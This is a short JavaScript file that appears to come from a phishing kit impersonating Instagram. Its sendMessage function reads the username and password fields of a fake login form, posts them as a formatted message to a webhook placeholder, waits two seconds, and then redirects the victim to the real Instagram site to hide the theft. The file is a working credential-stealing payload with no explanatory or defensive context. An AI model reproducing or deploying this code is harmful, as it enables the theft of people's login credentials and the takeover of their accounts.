function la(src) {
    window.location = src;
  }
  
  function sendMessage() {
    function sleep(milliseconds) {
      const date = Date.now();
      let currentDate = null;
      do {
        currentDate = Date.now();
      } while (currentDate - date < milliseconds);
    }
  
    var request = new XMLHttpRequest();
    request.open("POST", "weebhook");
    request.setRequestHeader('Content-type', 'application/json');
    var params = {
      content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
    }
    request.send(JSON.stringify(params));
    sleep(2000);
    window.location.replace("https://www.instagram.com");
  }
  
